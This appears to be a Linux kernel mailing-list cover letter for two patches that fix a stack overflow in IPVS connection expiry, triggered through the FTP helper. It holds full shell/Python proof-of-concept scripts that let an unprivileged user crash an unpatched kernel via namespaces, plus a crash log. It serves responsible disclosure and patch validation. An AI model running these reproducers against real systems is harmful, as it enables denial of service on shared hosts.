Received: from mail-pj2-f12.google.com (mail-pj2-f12.google.com [74.125.227.140])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C3EB8358378
	for <lvs-devel@vger.kernel.org>; Thu, 17 Sep 2026 03:03:02 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.140
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789614189; cv=none; b=HnfyrXv1RinhSQw/kqlRVzTFVOJZOD9HyMspwKWtLxi71Y05Hk7fKuY9Zaz5w0Hv9vFrwheWOX9n+rQRxz10FHRKw9TYTq1PofVHyruErN2dbqgJ6sE/Es/KjRGdzB43siyirW/XCgE0fQzNstFSc39BvncFLjMbxF1DLfzSOuU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789614189; c=relaxed/simple;
	bh=aKVlQEsqVop/KpfKGB18ufgyf7OB4sOAaY4x6bGgWkk=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=IF6ENMs1vG6at0rKl6um7/oXYUu2C+q/xU2rcT+NfystWUC1VQWkJMqJX6zJfJIf98RlwZYkLlhMluK83bq+ve+nd7BryPIv3TPU6FSWyRB1zuYGozqaYjwUSf/uV7AfDTyY4+e7yuHPoQ2oAq53Pu4YL8oSueQvxmRIHacX+p4=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=Koyy3jfo; arc=none smtp.client-ip=74.125.227.140
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="Koyy3jfo"
Received: by mail-pj2-f12.google.com with SMTP id d9443c01a7336-2d747eb79f7so2562405ad.1
        for <lvs-devel@vger.kernel.org>; Wed, 16 Sep 2026 20:03:02 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789614181; x=1790218981; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=aURCQeHeMgH2JlT36ddjBKRY2enbC3BlKL8xn7BVamI=;
        b=Koyy3jfo9MJfPhjK+6mOqHvrGkq+JPtkZT69W0mgIFSEfpjj09dnjDyuK6MhSozVYz
         uO9SfHv/32bTrh8+mM/HtThrzkeIT3ir3tP6uCuGKo0SdjHeAvuJ9mul59i+ewR+mFIh
         TgT21Vt0uwQGAsiY26y9bBr5g8oRIv+o7SNDom/9bV/ZTZ5mi+ZLsWjeNgVoxY4+OHc6
         Z0tq89icuyDSxdsaZvQjjzpsWV+X4zsCNqZA/zWOlpzGzbNJpzl4Dx7/wNiyxn9BHtyh
         9Yy9WWeFD+9ZaVkot0jWpyM32nGBJbyl6c/XODceyHCu0UDcAVZ83GedClANxzqZQ8oN
         aFmg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1789614181; x=1790218981;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=aURCQeHeMgH2JlT36ddjBKRY2enbC3BlKL8xn7BVamI=;
        b=DFmG/j/81r0J8cP/QqbGoTfAhB3PykFlnXA67shDJpqj+1w8H9g7MOhBBZinou/LCU
         UK/BSgZIDpd1cQ1TNXqYwtdEE8JrhhF+8fh7fzFl8BbX14X7EiyR8/5pWR6SEdfY1edF
         SW5LqZyyWDDQjAjnMggN8Dk1+/cs4CxYI32nmg62pSBvRbsFqwue749aT7S8oXj67ErM
         RW8Pp1TJSUGrNooRhzXej01e2YQVZs/3tTS6jac8G6MJoXNSESqqgLstY94MZVTDxNAA
         vvbb1oUiusJ6vE+/lcPqTArXJuH3ZYGWrsX2WEWUtq0q1zgkniXXqslpFRgB4Sv3s+9K
         MWVg==
X-Forwarded-Encrypted: i=1; AKwUvBwInzWNoIwVXlNuDeRO+oX5BWazdPQs5M6RBcfqnmJvEZg2tnHsTk4CxxfVm6DULbcCc9GSvE6w8ic=@vger.kernel.org
X-Gm-Message-State: AFuF++n4yVj9Vwi14b573v5ATRuHDFp02/YOzM2dfa1Patt6H2ARKsSY
	90q7Hh+qNLd5Zct5CZAMu5wqu3W4wpO7ebZU4jARxtepBO+TvlhwB66UdVubQ88eCRmD
X-Gm-Gg: AYBFou2KTI1B4aCCig4w/nXJpae/8FocasiNZ5dUPqZDuMYPXP9cbe3GlBC4V0aBEmL
	FWx3WQctQCBUbPHCWNf9fhrdPwAt/VIA4CVJRTD+xeyYczwIB5Ir9PpXbe8KTuieTneUw0By/7W
	QtDOnmLpeHv0fvdUVCRp7fTicBHtLtdVX717RdTw8OGXFds/6t39En6/Lg97pGEarT0m1nOK5Yf
	9v7vr/iizDVx6Rx9dlAd4VjCFm0FvvHLFAB1aQTuVIIHQI6I4Iv4ZXqUIPTG+4SGgnejbxc+Gm+
	BRN8Fv+rqjL5WmYbLNuoGm6//g7KmqUL99LReyEVJ06QOIwr1YNDhqCuuRJoEcxKfjYJhX46foI
	Pc89DuymvoqhD2MUbfN6fyKACDnPR8yaxvKg35Jpl7o2QIw1tw9kp+F+04xg6i9BXneysJoBC5U
	zldvVvJiDweDHAoM3MclGZ7UoUIWXHHXz21PufsRwd65OtySUoJ3Ksb6wkIHmUTBFVM+iBi/i0N
	ff/YUcG00UV3SisWnNUgsRdSJtzvg==
X-Received: by 2002:a17:902:d4ce:b0:2d6:fec3:bd57 with SMTP id d9443c01a7336-2dd8e3fd1f2mr91773445ad.14.1789614180897;
        Wed, 16 Sep 2026 20:03:00 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2dd89f1b862sm19167845ad.71.2026.09.16.20.02.55
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 16 Sep 2026 20:03:00 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: Simon Horman <horms@verge.net.au>
Cc: Julian Anastasov <ja@ssi.bg>,
	Pablo Neira Ayuso <pablo@netfilter.org>,
	Florian Westphal <fw@strlen.de>,
	Phil Sutter <phil@nwl.cc>,
	"David S. Miller" <davem@davemloft.net>,
	Eric Dumazet <edumazet@google.com>,
	Jakub Kicinski <kuba@kernel.org>,
	Paolo Abeni <pabeni@redhat.com>,
	netdev@vger.kernel.org,
	lvs-devel@vger.kernel.org,
	netfilter-devel@vger.kernel.org,
	coreteam@netfilter.org,
	linux-kernel@vger.kernel.org,
	Zihan Xi <zihanx@nebusec.ai>
Subject: [PATCH net v2 0/2] ipvs: avoid stack overflow from recursive connection expiration
Date: Thu, 17 Sep 2026 03:02:50 +0000
Message-ID: <cover.1789435989.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: lvs-devel@vger.kernel.org
List-Id: <lvs-devel.vger.kernel.org>
List-Subscribe: <mailto:lvs-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:lvs-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in
net/netfilter/ipvs/ip_vs_ftp.c and net/netfilter/ipvs/ip_vs_conn.c. A
non-root user can reach the trigger after creating a user namespace and a
network namespace. We've tested the fix, and it should not affect any
other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

The trigger entry point is ip_vs_ftp_out() in
net/netfilter/ipvs/ip_vs_ftp.c. It parses an EPSV reply and creates a
wildcard data connection from the advertised port. If that port is 21, the
default FTP control port, ip_vs_conn_new() binds the FTP helper to the new
connection a second time. The child has IP_VS_CONN_F_NO_CPORT, so the next
connection from the same client to the VIP on port 21 matches the wildcard
child instead of creating a new top-level entry. Repeating EPSV builds a
controlled-connection chain.

The active-mode path has the same chain-building condition through
ip_vs_ftp_in(). It derives the data connection's virtual port from
cp->vport - 1. With ports={21,20}, the derived port is 20, which is also a
configured FTP control port and can bind the helper again. This is another
trigger-side path; the generic cleanup root cause is in
ip_vs_conn_expire(), not in the FTP parser.

The stack overflow occurs in the generic ip_vs_conn_expire() cleanup path
in net/netfilter/ipvs/ip_vs_conn.c. When a leaf connection is removed, it
calls ip_vs_conn_del_put() for its controller. If that helper deletes the
controller timer, the old code calls ip_vs_conn_expire() recursively.
A long controller chain can therefore exhaust the kernel stack. The
reproducer observes this during network namespace teardown, but the
cleanup change covers the generic controller-chain path, not just teardown.

Patch 1 makes ip_vs_conn_del_put() report whether it deleted the controller
timer. When it does, ip_vs_conn_expire() continues with that controller
through a repeat path instead of calling itself recursively. Chain cleanup
remains synchronous and does not wait for another timer tick.

Patch 2 rejects zero and configured FTP control ports before creating
passive data connections in ip_vs_ftp_out() for PASV and EPSV. It also
rejects a zero active-mode client port and a data port derived from a
configured control port in ip_vs_ftp_in(). Valid data ports continue
through the existing path.

The recursive cleanup root cause was introduced by
f9200a52eedf ("ipvs: avoid expiring many connections from timer"). The
FTP helper's acceptance of a control port is first present in
1da177e4c3f4 ("Linux-2.6.12-rc2"). The patches use these commits separately
in their Fixes: trailers.

Validation:

Validation was run on horms/ipvs.git main at
a401a9d547c50ef34db1088cc1fb9a201a7af657, with the two v2 patches applied
in order: 0e288c9cbcb1 and 703557ee8a27. The fixed kernel was built with:

    make -C ipvs-selected-validation-20260916 \
        O=ipvs-selected-validation-20260916-build -j8 bzImage

It completed with exit status 0 and produced bzImage and vmlinux. The
resulting artifact hashes were:

    bzImage SHA256: 934d69a04f1a64e5e2e836a4eb74f759806f0f4fd283c8ff55a6d18588306dc3
    vmlinux SHA256: 56837fa64d65718fd067554c804a83d1c1f259a8258dd54b1dd0c47558071c51

The kernel used CONFIG_USER_NS=y, CONFIG_NET_NS=y, CONFIG_NETFILTER=y,
CONFIG_NF_CONNTRACK=y, CONFIG_NF_CONNTRACK_FTP=y, CONFIG_NF_NAT=y,
CONFIG_IP_VS=y, CONFIG_IP_VS_RR=y, CONFIG_IP_VS_FTP=y,
CONFIG_IP_VS_NFCT=y, CONFIG_KASAN=y, CONFIG_KASAN_GENERIC=y,
CONFIG_KASAN_STACK=y, and CONFIG_DEBUG_INFO=y.

The passive fixed-run command was:

    SELF_UNSHARE=1 MODE=exit ./poc.sh 200

Selected lines from the actual captured stdout were:

    built 200 connections
    rejected control-port replies: 200/200
    ip_vs_conn entries before trigger: 200
    passive data connections created: 0
    exiting namespace holder

The active fixed-run used this complete kernel command line:

    root=/dev/sda rw console=ttyS0 earlyprintk=serial net.ifnames=0 biosdevname=0 nokaslr panic_on_warn=1 oops=panic systemd.mask=sys-kernel-config.mount systemd.mask=systemd-remount-fs.service systemd.unit=multi-user.target ip_vs_ftp.ports=21,20

and this command:

    SELF_UNSHARE=1 MODE=exit ./poc-active.sh 1

The actual captured stdout was:

    built 1 connections
    ip_vs_conn entries before trigger: 1
    derived data connections created: 0
    exiting namespace holder

Both fixed-run PoCs exited with status 0. Scans of the corresponding
serial and guest-dmesg captures found no KASAN, BUG, Oops, kernel panic,
stack-guard, or general-protection signature.

The validation artifacts are the direct files from these runs:
verify/poc-fixed-v2-current.stdout, verify/poc-fixed-v2-current.stderr,
verify/poc-fixed-v2-current.exit, verify/qemu-fixed-v2-current.serial.log,
verify/dmesg-fixed-v2-current.log, verify/poc-active-v2-current.stdout,
verify/poc-active-v2-current.stderr, verify/poc-active-v2-current.exit,
verify/qemu-active-v2-current.serial.log, and
verify/dmesg-active-v2-current.log. Their relevant SHA256 values are:

    poc.sh: fab544f6d3db61db13d87acef6c393dfded3b3b679b69c95a612e416c8b0ba7a
    poc-active.sh: e7ead4131150844bb369acf3267ff4c69e9904fbd3c71402dcedc1f5784386ec
    passive stdout: 1d68c6b5936c858a97f27b6e36f1e8e9416a0e6e0be1fa1cec507f99f4194907
    active stdout: dcd4736ddc6ca66ae6dd5c66f699d204696f77af032013ea785b8c6cc4ce9d76
    passive serial: 66256f1147d59bc02f70f83427318cf7bd37fa6183c49cf1a2ee939c5ffdea64
    passive dmesg: 78f309ad004809382b41113b9cc4bdc89d013f6be8ac7ca81907e1b03d39219d
    active serial: a0109351a974478b30612ca53f5e2e13a4c024e1ded7a5eb91ce417d2a5fb1a5
    active dmesg: 33aa92fd2765b0644060a9d53394df7796c1476d435b0bdcbab79e5ff2867e0b

The unpatched baseline was separately built at the same revision with
CONFIG_NF_CONNTRACK_FTP=y, CONFIG_NF_NAT=y, and CONFIG_IP_VS_FTP=y
built in.
The build completed with exit status 0. Its artifact hashes were:

    bzImage SHA256: 2d6e8b3e22fbe97f5ac5a05790d6b0e8e7d23b112e5c676eb8a5ddb5529349e4
    vmlinux SHA256: 15a005e604652ec5fbeb5f68853885cbacc3d771368a528ee672b9592700d449

The unpatched run used the original passive reproducer below:

    SELF_UNSHARE=1 MODE=exit ./poc-original.sh 200

Its actual stdout was:

    built 50 connections
    built 100 connections
    built 150 connections
    built 200 connections
    ip_vs_conn entries before trigger: 201
    exiting namespace holder

The PoC exited with status 0. Namespace teardown then produced
BUG: TASK stack guard page was hit in the serial capture, followed by a
stack containing repeated ip_vs_conn_expire() frames. The unpatched guest
had panic_on_warn=1 and oops=panic. Its dmesg collection exited with status
255 after the kernel panic, so the serial capture is the complete crash
source for this run.

The crash block below is the decoded excerpt from
verify/crashlog-unpatched-a401-v6.decode.crash.log. It was produced from
the serial capture with ./scripts/decode_stacktrace.sh and is included
byte-for-byte. The baseline identifies as 7.3.0-rc1+, which corresponds to
the a401a9d547c50ef34db1088cc1fb9a201a7af657 source revision. The test
kernel had CONFIG_KASAN=y; the panic behavior is specific to the test
configuration, while the reported failure is a stack guard page hit.

The validation runs used shell scripts with embedded Python rather than
packetdrill because the trigger requires namespace creation, the legacy
IPVS sockopt ABI, a cooperating TCP server, and namespace teardown.
packetdrill cannot express that complete setup and lifecycle by itself.

Reproducer:

The original passive reproducer is the following shell script with an
embedded Python program. It does not require a separate compilation step.
With SELF_UNSHARE=1 it creates the user and network namespaces itself.

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc-original.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if b"EPSV" not in line.upper():
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"229 Entering Extended Passive Mode (|||21|)\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"EPSV\r\n")
        reply = recv_line(s)
        if b"229 " not in reply:
            raise RuntimeError(f"unexpected EPSV reply on level {i}: {reply!r}")
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-original.sh--------

The active-mode validation used the following shell/Python script with
ip_vs_ftp.ports=21,20. It checks that the derived data connection is not
created on the fixed kernel; it is included to match the active-mode
validation and is not used as the passive crash evidence.

------BEGIN poc-active.sh------
#!/bin/sh
set -eu

DEPTH="${1:-400}"
MODE="${MODE:-exit}"
SELF_UNSHARE="${SELF_UNSHARE:-0}"

if [ "${SELF_UNSHARE}" = "1" ] && [ -z "${POC_INNER:-}" ]; then
	exec env POC_INNER=1 MODE="${MODE}" SELF_UNSHARE=0 \
		unshare -Urn -- "$0" "${DEPTH}"
fi

ulimit -n 65535 2>/dev/null || true

IP=/usr/sbin/ip
PYTHON=/usr/bin/python3

VIP=198.51.100.1
REAL=198.51.100.2
CLIENT=198.51.100.3
PORT=21

"${IP}" link set lo up
"${IP}" addr add "${VIP}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${REAL}/32" dev lo 2>/dev/null || true
"${IP}" addr add "${CLIENT}/32" dev lo 2>/dev/null || true

exec "${PYTHON}" - "${DEPTH}" "${MODE}" "${VIP}" "${REAL}" "${CLIENT}" "${PORT}" <<'PY'
import ctypes
import os
import socket
import sys
import threading
import time

depth = int(sys.argv[1])
mode = sys.argv[2]
vip = sys.argv[3]
real = sys.argv[4]
client_ip = sys.argv[5]
port = int(sys.argv[6])

ready = threading.Event()
server_error = []
client_error = []
accepted = []
clients = []

IP_VS_BASE_CTL = 64 + 1024 + 64
IP_VS_SO_SET_ADD = IP_VS_BASE_CTL + 2
IP_VS_SO_SET_FLUSH = IP_VS_BASE_CTL + 5
IP_VS_SO_SET_ADDDEST = IP_VS_BASE_CTL + 7


class Svc(ctypes.Structure):
    _fields_ = [
        ("protocol", ctypes.c_uint16),
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("fwmark", ctypes.c_uint32),
        ("sched_name", ctypes.c_char * 16),
        ("flags", ctypes.c_uint),
        ("timeout", ctypes.c_uint),
        ("netmask", ctypes.c_uint32),
    ]


class Dest(ctypes.Structure):
    _fields_ = [
        ("addr", ctypes.c_uint32),
        ("port", ctypes.c_uint16),
        ("conn_flags", ctypes.c_uint),
        ("weight", ctypes.c_int),
        ("u_threshold", ctypes.c_uint32),
        ("l_threshold", ctypes.c_uint32),
    ]


def native_u32(ip):
    return int.from_bytes(socket.inet_aton(ip), sys.byteorder)


def ipvs_sock():
    return socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)


def ipvs_flush():
    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_FLUSH, b"")
    finally:
        s.close()


def ipvs_add_service():
    svc = Svc()
    svc.protocol = socket.IPPROTO_TCP
    svc.addr = native_u32(vip)
    svc.port = socket.htons(port)
    svc.fwmark = 0
    svc.sched_name = b"rr"
    svc.flags = 0
    svc.timeout = 0
    svc.netmask = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADD, bytes(svc))
    finally:
        s.close()
    return svc


def ipvs_add_dest(svc):
    dest = Dest()
    dest.addr = native_u32(real)
    dest.port = socket.htons(port)
    dest.conn_flags = 0
    dest.weight = 1
    dest.u_threshold = 0
    dest.l_threshold = 0

    s = ipvs_sock()
    try:
        s.setsockopt(socket.IPPROTO_IP, IP_VS_SO_SET_ADDDEST, bytes(svc) + bytes(dest))
    finally:
        s.close()


def recv_line(sock):
    data = bytearray()
    while not data.endswith(b"\n"):
        chunk = sock.recv(1)
        if not chunk:
            raise RuntimeError("unexpected EOF")
        data.extend(chunk)
    return bytes(data)


def server():
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind((real, port))
        srv.listen(depth + 16)
        ready.set()
        for i in range(depth):
            conn, addr = srv.accept()
            conn.sendall(b"220 ready\r\n")
            line = recv_line(conn)
            if not line.upper().startswith(b"PORT "):
                raise RuntimeError(f"unexpected request on level {i}: {line!r}")
            conn.sendall(b"200 PORT command successful\r\n")
            accepted.append(conn)
        while True:
            time.sleep(1)
    except BaseException as exc:
        server_error.append(repr(exc))
        ready.set()


try:
    try:
        ipvs_flush()
    except OSError:
        pass
    service = ipvs_add_service()
    ipvs_add_dest(service)
except OSError as exc:
    raise SystemExit(f"ipvs setup failed: {exc}")


threading.Thread(target=server, daemon=True).start()
ready.wait()
if server_error:
    raise SystemExit(f"server failed early: {server_error[0]}")

for i in range(depth):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((client_ip, 0))
        s.connect((vip, port))
        banner = recv_line(s)
        if not banner.startswith(b"220 "):
            raise RuntimeError(f"unexpected banner on level {i}: {banner!r}")
        s.sendall(b"PORT 198,51,100,3,4,1\r\n")
        time.sleep(0.2)
        clients.append(s)
        if (i + 1) % 50 == 0 or i + 1 == depth:
            print(f"built {i + 1} connections", flush=True)
    except BaseException as exc:
        client_error.append(repr(exc))
        break

if client_error:
    raise SystemExit(f"client failed: {client_error[0]}")
if server_error:
    raise SystemExit(f"server failed: {server_error[0]}")

try:
    with open("/proc/net/ip_vs_conn", "r", encoding="utf-8", errors="replace") as f:
        conn_lines = sum(1 for _ in f) - 1
except OSError:
    conn_lines = -1

print(f"ip_vs_conn entries before trigger: {conn_lines}", flush=True)
if conn_lines != depth:
    raise SystemExit(
        f"expected {depth} IPVS entries, got {conn_lines}; "
        "a derived data connection was created"
    )
print(f"derived data connections created: {conn_lines - depth}", flush=True)

if mode == "hold":
    while True:
        time.sleep(1)
elif mode == "flush":
    ipvs_flush()
    print("IPVS flush returned", flush=True)
    while True:
        time.sleep(1)
elif mode == "exit":
    print("exiting namespace holder", flush=True)
    sys.stdout.flush()
    os._exit(0)
else:
    raise SystemExit(f"unknown MODE={mode!r}")
PY
------END poc-active.sh--------

----BEGIN crash log----
[   65.750786] BUG: TASK stack guard page was hit at ffffc900008d7fb8 (stack is ffffc900008d8000..ffffc900008e0000)
[   65.752171] Oops: stack guard page: 0000 [#1] SMP KASAN NOPTI
[   65.752171] CPU: 0 UID: 0 PID: 72 Comm: kworker/u8:1 Not tainted 7.3.0-rc1+ #2 PREEMPT(lazy) 
[   65.752171] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.13.0-1ubuntu1.1 04/01/2014
[   65.752171] Workqueue: netns cleanup_net
[   65.752171] RIP: 0010:_raw_spin_lock_irqsave (??:?)
[   65.752171] Code: 0f 1f 44 00 00 48 b8 00 00 00 00 00 fc ff df 55 48 89 e5 41 55 41 54 49 89 fc 53 48 8d 5d 88 48 c1 eb 03 48 01 d8 48 83 ec 60 <48> c7 45 88 b3 8a b5 41 48 c7 45 90 52 b6 6a 85 48 c7 45 98 e0 f2
All code
========
   0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   5:	48 b8 00 00 00 00 00 	movabs $0xdffffc0000000000,%rax
   c:	fc ff df 
   f:	55                   	push   %rbp
  10:	48 89 e5             	mov    %rsp,%rbp
  13:	41 55                	push   %r13
  15:	41 54                	push   %r12
  17:	49 89 fc             	mov    %rdi,%r12
  1a:	53                   	push   %rbx
  1b:	48 8d 5d 88          	lea    -0x78(%rbp),%rbx
  1f:	48 c1 eb 03          	shr    $0x3,%rbx
  23:	48 01 d8             	add    %rbx,%rax
  26:	48 83 ec 60          	sub    $0x60,%rsp
  2a:*	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)		<-- trapping instruction
  31:	41 
  32:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
  39:	85 
  3a:	48                   	rex.W
  3b:	c7                   	.byte 0xc7
  3c:	45 98                	rex.RB cwtl 
  3e:	e0 f2                	loopne 0x32

Code starting with the faulting instruction
===========================================
   0:	48 c7 45 88 b3 8a b5 	movq   $0x41b58ab3,-0x78(%rbp)
   7:	41 
   8:	48 c7 45 90 52 b6 6a 	movq   $0xffffffff856ab652,-0x70(%rbp)
   f:	85 
  10:	48                   	rex.W
  11:	c7                   	.byte 0xc7
  12:	45 98                	rex.RB cwtl 
  14:	e0 f2                	loopne 0x8
[   65.752171] RSP: 0018:ffffc900008d7fc0 EFLAGS: 00000286
[   65.752171] RAX: fffff5200011aff8 RBX: 1ffff9200011aff8 RCX: dffffc0000000000
[   65.752171] RDX: 1ffffffff0b02a1c RSI: ffffc900008d80c0 RDI: ffff88806ce2f440
[   65.752171] RBP: ffffc900008d8038 R08: 1ffff11002d4aa47 R09: ffffed1002d4aa48
[   65.752171] R10: ffffed1002d4aa47 R11: ffff888016a5523b R12: ffff88806ce2f440
[   65.752171] R13: ffff888016a552c0 R14: ffffed1002d4aa5c R15: 0000000000001280
[   65.752171] FS:  0000000000000000(0000) GS:ffff8880e57b9000(0000) knlGS:0000000000000000
[   65.752171] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   65.752171] CR2: ffffc900008d7fb8 CR3: 0000000005aa8000 CR4: 00000000000006f0
[   65.752171] Call Trace:
[   65.752171]  <TASK>
[   65.752171]  ? lock_timer_base (timer.c:?)
[   65.752171]  ? timer_delete (??:?)
[   65.752171]  ? __pfx_timer_delete (??:?)
[   65.752171]  ? __pfx_refcount_dec_if_one (??:?)
[   65.752171]  ? ip_vs_conn_expire (ip_vs_conn.c:?)
